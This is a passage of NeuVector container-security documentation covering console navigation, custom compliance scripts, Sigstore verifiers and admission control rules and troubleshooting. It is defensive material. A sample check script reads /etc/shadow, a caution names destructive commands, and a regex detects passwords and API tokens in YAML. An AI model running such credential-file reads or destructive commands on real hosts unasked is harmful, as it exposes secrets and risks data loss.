a pod in a service mesh such as Istio/Linkerd2 to show the sidecar and workload containers within the pod.  The Tools menu in the upper left has these functions, from left to right:  Zoom in/outReset the icon displays (if you've moved them around)Open the Advanced Filter window (filters remain for the user login session)Display/Hide the LegendTake a screen shotRefresh the Network Activity Display    Right clicking on a container displays the following actions:    You can view active sessions, start packet capture recordings, and quarantine from here. You can also change the overall protection mode for the service (all containers for that service) here. The expand/collapse options enable you to simplify or expand the objects.  The data in the map may take a few seconds after network activity to be displayed.  See the explanation of the Legend icons at the bottom of this page.  Assets​  Assets displays information about Platforms, Nodes, Containers, Registries, Sigstore Verifiers (used in Admission Control rules), and System Components (NeuVector Controllers, Scanners, and Enforcers).  NeuVector includes an end-to-end vulnerability management platform which can be integrated into your automated CI/CD process. Scan registries, images, and running containers and host nodes for vulnerabilities. Results for individual registries, nodes, and containers can be found here, while combined results and advanced reporting can be found in the Security Risks menu.  NeuVector also automatically runs the Docker Bench security report and Kubernetes CIS Benchmark (if applicable) on each host and running containers.  Note that the Status of all containers is shown in Assets -&gt; Containers, which indicates the NeuVector protection mode (Discover, Monitor, Protect). If the container is shown in an 'Exit' state, it is still on the host but is stopped. Removing the container will remove it from an Exit state.  Please see the section Scanning &amp; Compliance for additional details, including how to use the Jenkins plug-in NeuVector Vulnerability Scanner.  Policy​  This displays and manages the run-time Security Policy which determines what container networking, process, and file system application behavior is ALLOWED and DENIED. Any conversations and activities which are not explicitly allowed are logged as violations by NeuVector. This is also where Admission Control rules can be created.  Please see the Security Policy section of these docs for a detailed explanation of the behavior of the rules and how to edit or create rules.  Security Risks​  This enables customizable Vulnerability and Compliance management investigation, triage, and reporting. Easily research image vulnerabilities and find out which nodes or containers contain those vulnerabilities. Advanced filtering makes reviewing scan and compliance check results and provides customized reporting.  These menu's combine results from registry (image), node, and container vulnerability scans and compliance checks to enable end-to-end vulnerability management and reporting.  Notifications​  This is where you can see the logs for Security Events, Risk Reports (e.g. Scanning) and general Events. NeuVector also supports SYSLOG for integration with tools such as SPLUNK as well as webhook notifications.  Security Events  Use the search or Advanced Filter to locate specific events. The timeline widget at the top can also be adjusted using the left and right circles to change the time window. You can also easily add rules (Security Policy) to allow or deny the detected event by selecting the Review Rule button and deploying a new rule.  NeuVector continuously monitors all containers for know attacks such as DNS, DDoS, HTTP-smuggling, tunneling etc. When an attack is detected it is logged here and blocked (if container/service is set to protect), and the packet is automatically captured. You can view the packet details, for example:  Implicit Deny Rule is Violated  Violations are connections that violate the whitelist Rules or match a blacklist Rule. Violations detailed are captured and source IPs can be investigated further.  Other security events include privilege escalations, suspicious processes, or abnormal file system activity detected on containers or hosts.  Risk Reports  Registry scanning, run-time scanning, admission control events will be shown here. Also, CIS benchmarks and compliance checks results will be shown.  Please see the Reporting section for additional details and limits of the event displays in the console.  Settings​  Settings -&gt; Users &amp; Roles​  Add other users here. Users can be assigned an Admin role, a Read-only role, or custom role. In Kubernetes, users can be assigned one or more namespaces to access. Custom roles can also be configured here for users and Groups (e.g. LDAP/AD) to be mapped to the roles. See the users section for configuration details.  Settings -&gt; Configuration​  Configure a unique cluster name, new services mode, and other settings here.  If deploying on a Rancher or OpenShift cluster, authentication can be enabled such that Rancher users or OpenShift users can log into the NeuVector console with the associated RBACs. For Rancher users, a connecting button/link from the Rancher console allows Rancher admin's to open and access the NeuVector console directly.  The New Service Mode sets which protection mode any new services (applications) previously unknown or undefined in NeuVector will by default be set to. For production environments, it is not recommended to set this to Discover.  The Network Service Policy Mode, if enabled, applies the selected policy mode globally to the network rules for all groups, and each Group’s individual policy mode will only apply to process and file rules.  The Automated Promotion of Group Modes promotes a Group’s protection Mode automatically (from Discover to Monitor to Protect) based on elapsed time and criteria.  The Auto-Deletion of Unused Groups is useful for automated 'clean-up' of the discovered (and auto-created rules for) groups which are no longer in use, especially high-churn development environments. See Policy -&gt; Groups for the list of groups in NeuVector. Removing unused Groups will clean up the Groups list and all associated rules for those groups.  The X-FORWARDED-FOR enables/disables use of these headers in enforcing NeuVector network rules. This is useful to retain the original source IP of an ingress connection so it can be used for network rules enforcement. Enable means the source IP will be retained. See below for a detailed explanation.  Multiple webhooks can be configured to be used in Response Rules for customized notifications. Webhook format choices include Slack, JSON, and key-value pairs.  A Registry Proxy can be configured if your registry scanning connection between the controller and the registry must go through a proxy.  Configure SIEM integration through SYSLOG, including types of events, port etc. You can also choose to send events to the controller pod logs instead of or in addition to syslog. Note that these events will only be sent to the lead controller pod's log (not all controller pod logs in a multi-controller deployment).  An integration with IBM Security Advisor and QRadar can be established.  Import/Export the Security Policy file. You can configure SSO for SAML and LDAP/AD here as well. See the Enterprise Integration section for configuration details. Important! Be careful when importing the configuration file. Importing will overwrite the existing settings. If you import a ‘policy only’ file, the Groups and Rules of the Policy will be overwritten. If you import a file with ‘all’ settings, then the Policy, Users, and Configurations will be overwritten. Note that the original ‘admin’ user’s password of your current Controller will also be overwritten with the original admin’s password in the imported file.  The Usage Report and Collect Log exports may be requested by your NeuVector support team.  X-FORWARDED-FOR Behavior Details​  In a Kubernetes cluster, an application can be exposed to the outside of the cluster by a NodePort, LoadBalancer or Ingress services. These services typically replace the source IP while doing the Source NAT (SNAT) on the packets. As the original source IP is masqueraded, this prevents NeuVector from recognizing the connection is actually from the 'external'.  In order to preserve the original source IP address, the user needs to add the following line to the exposed services, in the 'spec' section of the external facing load balancer or ingress controller. (Ref: https://kubernetes.io/docs/tutorials/services/source-ip/)  &quot;externalTrafficPolicy&quot;:&quot;Local&quot;   Many implementations of LoadBalancer services and Ingress controllers will add the X-FORWARDED-FOR line to the HTTP request header to communicate the real source IP to the backend applications. This product can recognize this set of HTTP headers, identify the original source IP and enforce the policy according to that.  This improvement created some unexpected issues in some setup. If the above line has been added to the exposed services and NeuVector network policies have been created in a way that expect the network connections are coming from internal proxy/ingress services, because we now identify the connections are from &quot;external&quot; to the cluster, normal application traffic might trigger alerts or get blocked if the applications are put in &quot;Protect&quot; mode.  A switch is available to disable this feature. Disabling it tells NeuVector not to identify that the connection is from &quot;external&quot; using X-FORWARDED-FOR headers. By default this is enabled, and the X-FORWARDED-FOR header is used in policy enforcement. To disable it, go to Settings -&gt; Configuration, and disable the &quot;X-Forwarded-For based policy match&quot; setting.  Settings -&gt; LDAP/AD, SAML, and OpenID Connect​  NeuVector supports integration with LDAP/AD, SAML, and OpenID Connect for SSO and user group mapping. See the Enterprise Integration section for configuration details.  Multiple Cluster Management​  You can manage multiple NeuVector clusters (e.g. multiple Kubernetes clusters running NeuVector on different clouds or on premise) by selecting a Master cluster, and joining remote clusters to them. Each remote cluster can also be individually managed. Security rules can be propagated to multiple clusters through use of Federated Policy settings.  My Profile​  You can increase the browser timeout setting, change your password and do other administrative profile edits.  Icon Descriptions in Legend &gt; Network Activity​  You can toggle the Legend on/off in the tools box of the Network Activity map.  Here is what the icons mean:  External network​  This is any network outside the NeuVector cluster. This could include internet public access or other internal networks.  Namespace​  Namespace in Kubernetes or Project in OpenShift  Group/Container/Service Mesh in discovery​  This container is in Discover mode, where connections to/from it are learned and whitelist rules will automatically be created.  Group/Container/Service Mesh being monitored​  This container is in Monitor mode, where violations will be logged but not blocked.  Group/Container/Service Mesh being protected​  This container is in Protect mode, where violations will be blocked.  Container Group​  This represent a group of containers in a service. Use this to provide a more abstract view if there are many container instances for a service/application (i.e. from the same image).  Un-managed node​  This node has been detected but does not have a NeuVector enforcer on it.  Un-managed container​  This container has been detected but is not on a node with a NeuVector enforcer on it. This could also represent some system services.  Exited Container​  This container is not running but in an 'exited' state.  IP group​  This is a group of IP Addresses.  Normal Conversation​  Allowed, whitelisted connections are displayed in blue.  Internal Conversation​  A connection within a service is shown in light gray.  Conversation with warning​  A connection which has generated a violation alert is shown in lighter red.  Conversation being blocked​  If a connection is a violation, as shown in red, and has been blocked by NeuVector, the arrow will have an ‘x’ in it.  Quarantined container​  Containers with a red circle around them have been quarantined. To un-quarantine, right-click on the container and select the un-quarantine button. ","version":"Next 🚧","tagName":"h3"},{"title":"Sigstore Cosign Signature Verifiers","type":0,"sectionRef":"#","url":"/next/policy/admission/sigstore","content":"","keywords":"","version":"Next 🚧"},{"title":"Configuring Sigstore/Cosign Verifiers for Requiring Image Signing​","type":1,"pageTitle":"Sigstore Cosign Signature Verifiers","url":"/next/policy/admission/sigstore#configuring-sigstorecosign-verifiers-for-requiring-image-signing","content":" NeuVector enables a user to perform signature verification logic by integrating image signatures generated by Sigstore's cosign tool.  The following is an example of an admission control configuration that requires a deployment's image be signed by an appropriate key or identity.  First, configure a root of trust. This can either be a public or private root of trust, depending on the Sigstore deployment used to generate signatures. If you have deployed your own instances of Sigstore's services, select the private root of trust option.  A public root of trust does not need any additional configuration outside of giving it an easily referenced name.    A private root of trust requires the the keys and/or certificates from your privately deployed instances of Sigstore's services.    Next, for a given root of trust, configure each of the verifiers that you would like to use during admission control. There are two types of verifiers: keypair and keyless. A keypair verifier would be used when trying to verify an image signed by a user-defined private key. A keyless verifier would be used when verifying a signature generated by Sigstore's keyless pattern. More information about the Sigstore signing methods can be seen here.  To configure a keypair verifier, provide a name, and a public key corresponding to a target private key.    To configure a keyless verifier, provide the OIDC issuer and identity used during signing.    Note that after root-of-trust and verifier configuration, an image must be scanned in order to determine which verifiers the given image's signatures satisfy.  The configured verifiers that an image satisfies can be viewed in the upper right section of a given image's scan results in Assets-&gt;Registries. If an image is not signed by a verifier, it will not appear in its scan results.    To reference a particular root of trust and verifier in an admission control rule, join the two names with a forward slash like so: my-root-of-trust/my-verifier.    To require an image be signed in an admission control rule, set the True/False value for the Image Signed criteria.   ","version":"Next 🚧","tagName":"h3"},{"title":"Custom Compliance Checks","type":0,"sectionRef":"#","url":"/next/policy/customcompliance","content":"","keywords":"","version":"Next 🚧"},{"title":"Creating Custom Scripts for Compliance Checks​","type":1,"pageTitle":"Custom Compliance Checks","url":"/next/policy/customcompliance#creating-custom-scripts-for-compliance-checks","content":" Custom scripts can be run on containers and hosts for use in compliance checks and other assessments. The Custom Compliance check is a bash script that can be run on any container to validate a condition and report result in the container or node compliance section.  note The ability to create custom scripts is disabled by default to protect against misuse. This can be enabled be setting the CUSTOM_CHECK_CONTROL environment variable in the Controller and Enforcer. Values are &quot;disable&quot; (default, not allowed), &quot;strict&quot; (admin role only), or &quot;loose&quot; (admin, compliance, and runtime-policy roles).  caution Custom scripts should be used with extreme caution. The custom script can run any executable in the container namespace with container privilege. Executables can be very destructive, such as rm, format, fdisk etc. This caution applies to hosts/nodes as well. Custom check scripts on hosts can be even more destructive if they can access the master node in the cluster.  A custom script is controlled by the run-time policy permission with namespaced RBAC; users should setup the Kubernetes user roles properly.Custom scripts are run with the same privilege as the running container.The compliance result is removed once a custom script is deleted.Custom Compliance checks need to follow a format in order to report the result correctly in the compliance report for the container or node. Script starts with 'if' statement to check some conditionCustom check is pass if exit code is 0Custom check is fail if exit code is 1  Sample script to check if container has root account with no password.​  if [ $(cat /etc/shadow | grep 'root:::0:::::') ]; then DESCRIPTION=&quot;CVE-2019-5021 fails.&quot; echo $DESCRIPTION; exit 1; else echo &quot;CVE-2019-5021 pass&quot;; exit 0; fi   Sample script to check dirty cow file in the container.​  if [ $(find . / | grep -w 'cow') ]; then DESCRIPTION=&quot;dirty cow seen in the container&quot; echo $DESCRIPTION; exit 1; else echo &quot;no dirty cow found pass&quot;; exit 0; fi   Other Notes  Scripts have a timeout of 1 minute to complete, otherwise they are killed and reported as an error in the compliance result.Script can be executed when in all 3-operating modes, Discover, Monitor, and Protect.  ","version":"Next 🚧","tagName":"h3"},{"title":"Creating a custom check script​","type":1,"pageTitle":"Custom Compliance Checks","url":"/next/policy/customcompliance#creating-a-custom-check-script","content":" Select the service group (user created or auto learned) from Policy -&gt; Group.Click custom check tab.Enter name of the script. Spaces are not allowed.Copy and paste script to script section.Click ADD button to add script.Multiple scripts can be created and managed from the option provided in the right side corner.Scripts are run on the containers covered by the service group as soon as script is created as well as when the script is updated.View the script result from Assets -&gt; Container -&gt; Compliance, or Assets -&gt; Nodes -&gt; Compliance.  Samples​  Creating a custom check script on demo group comprised of 3 containers    Showing compliance results for nginx container, which has a dirty cow file, so a warning is reported.    Showing compliance result for nodejs container, which does not have a dirty cow file, so a pass is reported from the script.    Showing compliance result for nginx container for a custom check that had a timeout.    ","version":"Next 🚧","tagName":"h3"},{"title":"Creating a response rule for compliance report​","type":1,"pageTitle":"Custom Compliance Checks","url":"/next/policy/customcompliance#creating-a-response-rule-for-compliance-report","content":" Response rules can be created in Policy -&gt; Response Rules that are based on results of custom compliance check results. The results are part of the category Compliance, and responses can be created for all events of a certain level.  Choose category complianceType service group name in group option and choose desired group from auto select optionType level and choose level:Warning from auto select optionEnable desired actions Quarantine, webhook and/or suppress logEnable status buttonClick Add button to add the response rule  The next compliance event with result warning will trigger the corresponding response rule action.    Create a response rule for compliance report and custom check script by name:  Choose category complianceType service group name in the group option and choose the desired group from drop down options, or leave the group name blank to apply to allType 'n' and choose custom check script name from the drop down menu of optionsEnable desired actions Quarantine, webhook and/or suppress logEnable status buttonClick Add button to add the response rule  The next compliance event with warning will trigger the corresponding response rule action.   ","version":"Next 🚧","tagName":"h3"},{"title":"Admission Controls","type":0,"sectionRef":"#","url":"/next/policy/admission","content":"","keywords":"","version":"Next 🚧"},{"title":"Controlling Image / Container Deployments​","type":1,"pageTitle":"Admission Controls","url":"/next/policy/admission#controlling-image--container-deployments","content":" With Admission Control integration with orchestration platforms such as Kubernetes and OpenShift, NeuVector is playing an important role within the orchestration platform’s deployment pipeline. Whenever a cluster resource such as Deployment is created, the request from the cluster apiserver will be passed to one of the NeuVector Controllers to determine if it should be allowed to deploy or denied based on the user-defined Admission Control rules prior to creating the cluster resource. The policy decision NeuVector makes will be passed back to cluster apiserver for enforcement.  This feature is supported in Kubernetes 1.9+ and Openshift 3.9+. Before using the Admission Control function in NeuVector, while it's possible to setup admission control from --admission-control argument passed to the cluster apiserver, it's recommended to use dynamic admission control. Please see Kubernetes and Openshift sections below for configuration.  Kubernetes​  The ValidatingAdmissionWebhook and MutatingAdmissionWebhook plugins are enabled by default.  Check if admissionregistration.kubernetes.io/v1beta1 is enabled  kubectl api-versions | grep admissionregistration admissionregistration.k8s.io/v1beta1   Openshift​  The ValidatingAdmissionWebhook and MutatingAdmissionWebhook plugins are NOT enabled by default. Please see the examples in the OpenShift deployment sections for instructions on how to enable these. A restart of the OpenShift api and controllers services is required.  Check if admissionregistration.kubernetes.io/v1beta1 is enabled  oc api-versions | grep admissionregistration admissionregistration.k8s.io/v1beta1   ","version":"Next 🚧","tagName":"h3"},{"title":"Enabling Admission Control (Webhook) in NeuVector​","type":1,"pageTitle":"Admission Controls","url":"/next/policy/admission#enabling-admission-control-webhook-in-neuvector","content":" The Admission Control feature is disabled by default. Please go to Policy -&gt; Admission Control page to enable it in the NeuVector console.    Once the Admission Control feature is enabled successfully, the following ValidatingWebhookConfiguration resource will be created automatically. To check it:  kubectl get ValidatingWebhookConfiguration neuvector-validating-admission-webhook   Sample output:  NAME CREATED AT neuvector-validating-admission-webhook 2019-03-28T00:05:09Z   The most important information in ValidatingWebhookConfiguration resource for NeuVector is cluster resources. Currently once a cluster resource such as Deployment NeuVector registered is created, the request will be sent from orchestration platform apiserver to one of the NeuVector Controllers to determine if it should be allowed or denied based on the user-defined rules in NeuVector Policy -&gt; Admission Control page.  If the resource deployment is denied, an event will be logged in Notifications.  To test the Kubernetes connection for the client mode access, go to Advanced Setting.    For special cases, the URL access method using the NodePort service may be required.  ","version":"Next 🚧","tagName":"h3"},{"title":"Admission Control Events/Notifications​","type":1,"pageTitle":"Admission Controls","url":"/next/policy/admission#admission-control-eventsnotifications","content":" All admission control events for allowed and denied events can be found in the Notifications -&gt; Security Risks menu.  ","version":"Next 🚧","tagName":"h3"},{"title":"Admission Control Criteria​","type":1,"pageTitle":"Admission Controls","url":"/next/policy/admission#admission-control-criteria","content":" NeuVector supports many criteria for creating an Admission Control Rule. These include CVE High Count, CVE Names, image labels, imageScanned, namespace, user, runAsRoot, etc. There are two possible sources of criteria evaluation, Image Scans and Deployment Yaml file scans. If a criterion requires an image scan, the scan results from Registry Scanning will be used. If the image was not scanned, the admission control rule will not be applied. If a criterion requires scanning of the deployment yaml, it will be evaluated from the Kubernetes deployment. Some criteria will use the results from either an image scan OR a deployment yaml scan.  CVE score is an example of a criterion requiring an image scan.Environment variables with secrets is an example of a criterion using the deployment yaml scan.Labels and Environment variables are examples of criteria which will use BOTH image and deployment yaml scans results (logical OR) to determine matches.    After the criterion is selected, the possible Operators will be displayed. Click the ‘+’ button to add each criterion.  Using Multiple Criteria in a Single RuleThe matching logic for multiple criteria in one admission control rule is:  For different criteria types within a single rule, apply 'and'For multiple criteria of same type (e.g. multiple namespaces, registries, images), Apply 'and' for all negative matches(&quot;not contains any&quot;, &quot;is not one of&quot;) until the first positive match;After the first positive match, apply 'or'  Example with Matching a Pod Label​  apiVersion: apps/v1 kind: Deployment metadata: name: iperfserver namespace: neuvector-1 spec: replicas: 1 template: metadata: labels: app: iperfserver   The rule to match would be:    Example with Matching Environment Variables with Secrets​  apiVersion: apps/v1 kind: Deployment metadata: name: iperfserver namespace: neuvector-1 labels: name: iperfserver spec: selector: matchLabels: name: iperfserver replicas: 1 template: metadata: labels: name: iperfserver spec: containers: - name: iperfserver image: nvlab/iperf env: - name: env1 value: AIDAJQABLZS4A3QDU576 - name: env2 valueFrom: fieldRef: fieldPath: status.podIP - name: env5 value: AIDAJQABLZS4A3QDU57E command: - iperf - -s - -p - &quot;6068&quot; nodeSelector: nvallinone: &quot;true&quot; restartPolicy: Always   The Matching rule would be:  Criteria Related to Scan Results​  The following criteria are related to the results in NeuVector Assets &gt; Registry scan page:  Image, imageScanned, cveHighCount, cveMediumCount, Image compliance violations, cveNames and others.  Before NeuVector performs the match against the Admission Control rules, NeuVector retrieves the image information (For example, 10.1.127.3:5000/neuvector/toolbox/iperf:latest) from the cluster apiserver (Please refer to Request from apiserver section below). The image is composed by registry server (https://10.1.127.3:5000), repository (neuvector/toolbox/iperf) and tag (latest).  NeuVector uses this information to match the results in NeuVector Assets -&gt; Registry scan page and collects the corresponding information such as cve name, cve high or medium count etc. Image compliance violations are considered any image which has secrets or setuid/setgid violations. If users are using the image from docker registry to create a cluster resource, normally the registry server information is empty or docker.io and currently NeuVector is using the following hard-coded registry servers to match the registry scan result instead of empty or docker.io string. Of course, if there are more other than the following supported docker registry servers defined in the registry scan page, NeuVector is unable to get the registry scan results successfully.  If users are using the built-in image such as alpine or ubuntu from the docker registry, there is a hidden organization name called library. When you look at the results for docker build-in image in NeuVector Assets &gt; Registry scan page, the repository name will be library/alpine or library/ubuntu. Currently NeuVector assumes there is only one hidden library organization name in docker registry. If there is more than one, NeuVector is unable to get the registry scan results successfully as well. The above limitation could also apply on other type of docker registry servers if any.  Creating Custom Criteria Rules​  Users can create a customized criterion to be used to allow or block deployments based on common objects found in the image yaml (scanned upon deployment). Select the object to be used, for example imagePullSecrets and the matching value, for example exists. It is also recommended to use additional criteria to further target the rule, such as namespace, PSP/PSA, CVE conditions etc.    Criteria Explanations​  Criteria with a disk icon require that the image be scanned (see registry scanning), and criteria with a file icon will scan the deployment yaml. If both icons are listed, then matching will be for either (OR). If a criterion requires an image scan, but the image is NOT scanned, that part of the rule will be ignored (ie rule is bypassed, or if deployment yaml is also listed, then only the deployment yaml will be used to match). To prevent non-scanned images from bypassing rules, see the Image Scanned criterion below.   Add customized criterion. Select the object from the drop down. All custom criteria support exists and does not exist operators. For ones that allow values, additional operators and the value can be entered. Values can be static, separated by comma’s, and include wildcards. Allow Privilege Escalation. If the container allows privilege escalations, it can be blocked by setting Deny as the action. Count of High Severity CVE. This takes the results of an image (registry) scan and matches on the number of High severity (CVSS scores of 7 or higher). Additional operator can be added to restrict to CVEs reported a certain number of days prior, giving time for remediation for recent CVEs. Count of High Severity CVE with fix. This takes the results of an image (registry) scan and matches on High severity (CVSS scores of 7 or higher), AND if there is a fix available for the CVE. Select this if only planning to block deployments of high CVEs if a fix should have been applied. Additional operator can be added to restrict to CVEs reported a certain number of days prior, giving time for remediation for recent CVEs. Count of Medium Severity CVE. This takes the results of an image (registry) scan and matches on the number of Medium severity (CVSS scores of between 4 and 6). Additional operator can be added to restrict to CVEs reported a certain number of days prior, giving time for remediation for recent CVEs. CVE names. This matches on specific CVE names (e.g. CVE-2023-23914, 2023-23914, 23914, or unique text) where multiple are separated by comma’s. CVE score. Configure both the minimum score as well as the number of CVEs matching or exceeding the minimum CVSS score. Environment variables with secrets. If the deployment yaml or image scan result contains (or does not contain) any environment variables with secrets. See the criteria for secrets matching below. Environment variables. Use this to require or exclude certain environment variables in the deployment yaml or image scan. Image. Matching on specific image names, typically combined with other criteria for the rule. Image compliance violations. Matches if the image (registry) scan results in any compliance violations. See compliance for details on compliance checks. Image without OS information. Matches if the image (registry) scan results in the inability to retrieve OS information. Image registry. Matches on specific image registry names. Typically used to restrict deployments from certain registries or require deployments only from certain approved registries. Often used with other criteria such as namespaces. Image scanned. Require that an image be scanned. Often used to make sure all images are scanned to ensure that scan based criteria such as high CVEs can be applied to deployments. Image signed. Require that an image be signed through the integration of Sigstore/Cosign. This criteria simply checks whether there is any verifier in the scan result.Image Sigstore Verifiers. Require that an image be signed by a specific Sigstore root-of-trust name, as configured in Assets -&gt; Sigstore Verifiers. Checks whether the verifiers in the scan result match the verifiers in the rule configuration.Labels. Require that one or more labels be present in the deployment yaml or image scan results. Modules. Requires or excludes certain modules (packages, libraries) from being present in the image as the result of the image (registry) scan. Mount volumes. Typically used to prevent certain volumes from being mounted. Namespace. Allow or restrict deployments for certain namespace(s). Used independently but often combined with other criteria to limit the rule matching to namespace. PSP Best Practice. Equivalent rules for PSP (note: PSP is completely removed from kubernetes 1.25+, however this NeuVector equivalent may still used in 1.25+). Includes Run as privileged, Run as root, Share host's PID namespaces, Share host's IPC namespaces, Share host's Network, Allow Privilege Escalation. Resource Limit Configuration (RLC). Requires resource limits to be configured for CPU Limit/Request, Memory Limit/Request, and can require operator to be &gt; or &lt;= a configured resource value. Run as privileged. Typically used to limit or block deployments of privileged containers. Run as root. Typically used to limit or block deployments of containers run as root.. Service Account Bound High Risk Role. Can match on multiple criteria which could respresent a high risk service account role, including listing secrets, performing any operations on workloads, modification of RBAC resources, creation of workload resources, and allowing exec into a container. Share host’s IPC namespaces. Matches on IPC namespaces. Share host’s Network. Allow or disallow deployments to share the host’s network. Share host’s PID namespaces . Matches on PID namespaces. User. Allow or disallow defined users bound by kubernetes at run-time, visible in the userInfo field. Note: The yaml (upload) auditing function will not be able to check this because it is bound at run-time. User groups. Allow or disallow defined user groups bound by kubernetes at run-time, visible in the userInfo field. Note: The yaml (upload) auditing function will not be able to check this because it is bound at run-time. Violates PSA policy. Matches if the deployment violates either a Restricted or Baseline PSA Pod Security Standard (equivalent to PSA definitions in kubernetes 1.25+)   Secrets detection​  Detection of secrets, for example in environment variables is matched used the following regex:  Rule{Description: &quot;Password.in.YML&quot;, Expression: `(?i)(password|passwd|api_token)\\S{0,32}\\s*:\\s*(?-i)([0-9a-zA-Z\\/+]{16,40}\\b)`, ExprFName: `.*\\.ya?ml`, Tags: []string{share.SecretProgram, &quot;yaml&quot;, &quot;yml&quot;}, Suggestion: msgReferVender},   A list of types of secrets detected can be found here   ","version":"Next 🚧","tagName":"h3"},{"title":"Admission Control Modes​","type":1,"pageTitle":"Admission Controls","url":"/next/policy/admission#admission-control-modes","content":" There are two modes NeuVector supports - Monitor and Protect.  Monitor: there is an alert message in the event log if a decision is denied. In this case, the cluster apiserver is allowed to create a resource successfully. Note: even if the rule action is Deny, in Monitor mode this will only alert.Protect: this is an inline protection mode. Once a decision is denied, the cluster resource will not be able to be created successfully, and an event will be logged.  ","version":"Next 🚧","tagName":"h3"},{"title":"Admission Control Rules​","type":1,"pageTitle":"Admission Controls","url":"/next/policy/admission#admission-control-rules","content":" Rules can be Allow (whitelist) or Deny (blacklist) rules. Rules are evaluated in the order displayed, from top to bottom. Allow rules are evaluated first, and are useful to define exceptions (subsets) to Deny rules. If a resource deployment does not match any rules, the default action is to Allow the deployment.  There are two pre-configured rules which should be allowed to enable Kubernetes system container and NeuVector deployments.  Admission control rules apply to all resources which create pods (e.g. deployments, daemonsets, replicasets etc).  For admission control rules, the matching order is:  Default allow rules (e.g. system namespaces)Federated allow rules (if these exist)Federated deny rules (if these exist)CRD applied allow rules (if these exist)CRD applied deny rules (if these exist)User-defined allow rulesUser-defined deny rulesAllow the request if the request doesn't match any rule's criteria above  In each of the matching stages(1~7), the rule order doesn't matter. As long as the request matches one rule's criteria, the action (allow or deny) is taken and the request is allowed or denied.  ","version":"Next 🚧","tagName":"h3"},{"title":"Federated Scan Results in Admission Control Rules​","type":1,"pageTitle":"Admission Controls","url":"/next/policy/admission#federated-scan-results-in-admission-control-rules","content":" The primary (master) cluster can scan a registry/repo designated as a federated registry. The scan results from these registries will be synchronized to all managed (remote) clusters. This enables display of scan results in the managed cluster console as well as use of the results in admission control rules of the managed cluster. Registries only need to be scanned once instead of by each cluster, reducing CPU/memory and network bandwidth usage. See the multi-cluster section for more details.  ","version":"Next 🚧","tagName":"h3"},{"title":"Configuring Sigstore/Cosign Verifiers for Requiring Image Signing​","type":1,"pageTitle":"Admission Controls","url":"/next/policy/admission#configuring-sigstorecosign-verifiers-for-requiring-image-signing","content":" Please see this section for configuring verifiers.  ","version":"Next 🚧","tagName":"h3"},{"title":"Troubleshooting​","type":1,"pageTitle":"Admission Controls","url":"/next/policy/admission#troubleshooting","content":" If experiencing errors and you have access to the master node you can inspect the kube-apiserver log to search for admission webhook events. Examples:  W0406 13:16:49.012234 1 admission.go:236] Failed calling webhook, failing open neuvector- validating-admission-webhook.neuvector.svc: failed calling admission webhook &quot;neuvector-validating- admission-webhook.neuvector.svc&quot;: Post https://neuvector-svc-admission- webhook.neuvector.svc:443/v1/validate/1554514310852084622-1554514310852085078?timeout=30s: dial tcp: lookup neuvector-svc-admission-webhook.neuvector.svc on 8.8.8.8:53: no such host   The above log indicates that the cluster kube-apiserver is unable to send the request to the NeuVector webhook successfully because it fails to resolve the neuvector-svc-admission-webhook.neuvector.svc name.  W0405 23:43:01.901346 1 admission.go:236] Failed calling webhook, failing open neuvector- validating-admission-webhook.neuvector.svc: failed calling admission webhook &quot;neuvector-validating- admission-webhook.neuvector.svc&quot;: Post https://neuvector-svc-admission-webhook.neuvector.svc:443/v1/validate/1554500399933067744-1554500399933068005?timeout=30s: net/http: request canceled while waiting for connection (Client.Timeout exceeded while awaiting headers)   The above log indicates that the cluster kube-apiserver is unable to send the request to the NeuVector webhook successfully because it resolves the neuvector-svc-admission-webhook.neuvector.svc name with the wrong IP address. It could also indicate a network connectivity or firewall issue between api-server and the controller nodes.  W0406 01:14:48.200513 1 admission.go:236] Failed calling webhook, failing open neuvector- validating-admission-webhook.xyz.svc: failed calling admission webhook &quot;neuvector-validating- admission-webhook.xyz.svc&quot;: Post https://neuvector-svc-admission- webhook.xyz.svc:443/v1/validate/1554500399933067744-1554500399933068005?timeout=30s: x509: certificate is valid for neuvector-svc-admission-webhook.neuvector.svc, not neuvector-svc-admission- webhook.xyz.svc   The above log indicates that the cluster kube-apiserver can send the request to the NeuVector webhook successfully but the certificate in caBundle is wrong.  W0404 23:27:15.270619 1 admission.go:236] Failed calling webhook, failing open neuvector- validating-admission-webhook.neuvector.svc: failed calling admission webhook &quot;neuvector-validating- admission-webhook.neuvector.svc&quot;: Post https://neuvector-svc-admission- webhook.neuvector.svc:443/v1/validate/1554384671766437200-1554384671766437404?timeout=30s: service &quot;neuvector-svc-admission-webhook&quot; not found   The above log indicates that the cluster kube-apiserver is unable to send the request to the NeuVector webhook successfully because the neuvector-svc-admission-webhook service is not found.  Review Admission Control Configurations​  First, check your Kubernetes or OpenShift version. Admission control is supported in Kubernetes 1.9+ and OpenShift 3.9+. For OpenShift, make sure you have edited the master-config.yaml to add the MutatingAdmissionWebhook configuration and restarted the master api-servers.  Check the Clusterrole  kubectl get clusterrole neuvector-binding-admission -o json   Make sure the verbs include:   &quot;get&quot;, &quot;list&quot;, &quot;watch&quot;, &quot;create&quot;, &quot;update&quot;, &quot;delete&quot;   Then check:  kubectl get clusterrole neuvector-binding-app -o json   Make sure the verbs include:   &quot;get&quot;, &quot;list&quot;, &quot;watch&quot;, &quot;update&quot;   If the above verbs are not listed, the Test button will fail.  Check the Clusterrolebinding  kubectl get clusterrolebinding neuvector-binding-admission -o json   Make sure the ServiceAccount is set properly:  &quot;subjects&quot;: [ { &quot;kind&quot;: &quot;ServiceAccount&quot;, &quot;name&quot;: &quot;default&quot;, &quot;namespace&quot;: &quot;neuvector&quot;   Check the Webhook Configuration  kubectl get ValidatingWebhookConfiguration --as system:serviceaccount:neuvector:default -o yaml &gt; nv_validation.txt   The nv_validation.txt should have similar content to:  apiVersion: v1 items: - apiVersion: admissionregistration.k8s.io/v1beta1 kind: ValidatingWebhookConfiguration metadata: creationTimestamp: &quot;2019-09-11T00:51:08Z&quot; generation: 1 name: neuvector-validating-admission-webhook resourceVersion: &quot;6859045&quot; selfLink: /apis/admissionregistration.k8s.io/v1beta1/validatingwebhookconfigurations/neuvector-validating-admission-webhook uid: 3e1793ed-d42e-11e9-ba43-000c290f9e12 webhooks: - admissionReviewVersions: - v1beta1 clientConfig: caBundle: {.........................} service: name: neuvector-svc-admission-webhook namespace: neuvector path: /v1/validate/{.........................} failurePolicy: Ignore name: neuvector-validating-admission-webhook.neuvector.svc namespaceSelector: {} rules: - apiGroups: - '*' apiVersions: - v1 - v1beta1 operations: - CREATE resources: - cronjobs - daemonsets - deployments - jobs - pods - replicasets - replicationcontrollers - services - statefulsets scope: '*' - apiGroups: - 